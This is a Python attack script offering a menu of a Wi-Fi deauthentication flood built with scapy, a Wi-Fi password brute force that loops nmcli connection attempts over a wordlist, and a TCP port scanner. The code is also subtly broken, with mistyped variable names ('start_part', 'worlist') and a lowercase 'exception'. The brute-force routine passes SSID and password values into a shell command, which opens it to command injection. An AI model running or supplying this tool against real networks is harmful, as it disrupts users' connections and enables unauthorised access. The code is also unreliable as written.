import socket
import itertools
from scapy.all import *
import subprocess

def send_deauth(target_mac, ap_mac, interface):
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)

def brute_force_attack(ssid, interface, wordlist):
    try:
        # Attempt to connect to the WiFi with different passwords
        for password in wordlist:
            command = f'nmcli dev wifi connect {ssid} password {password} iface {interface}'
            process = subprocess.run(command, shell = True, stdout=subprocess.PIPE)
            # Check for successful connections
            if "successfully activated" in process.stdout.decode():
                print(f"Password for {ssid} is {password}")
                return
        
        print("Password not found in the list.")
    except KeyboardInterrupt:
        print("Brute force attack interrupted.")
    except exception as e:
        print(f"An error has occurred: {e}")

def port_scanner(host, start_port, end_port):
    try:
        for port in range (start_part, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(2)
            result = sock.connect_ex((host, port))
            if result == 0:
                print(f"Port {port}: Open")
            sock.close()
    except Exception as e:
        print(f"An error occurred: {e}")

def main():
    choice = input("Enter 1 for Deauth attack, 2 for Brute Force Attack, 3 for port scan: ")
    interface = input("Enter your network interface: ")

    if choice == '1':
        target_mac = input("Enter target MAC address: ")
        ap_mac = input("Enter AP MAC address: ")
        send_deauth(target_mac, ap_mac, interface)
    elif choice == '2':
        ssid = input("Enter SSID of the Wi-Fi: ")
        wordlist_path = input("Enter path to password worlist: ")
        with open(wordlist_path, 'r') as file:
            worlist = file.read().splitlines()
        brute_force_attack(ssid, interface, wordlist)
    elif choice == '3':
        host = input("Enter the host IP to scan: ")
        start_port = int(input("Enter the start port number: "))
        end_port = int(input("Enter the end port number: "))
        port_scanner(host, start_port, end_port)
    else:
        print("Invalid option selected.")

if __name__ == '__main__':
    main()


          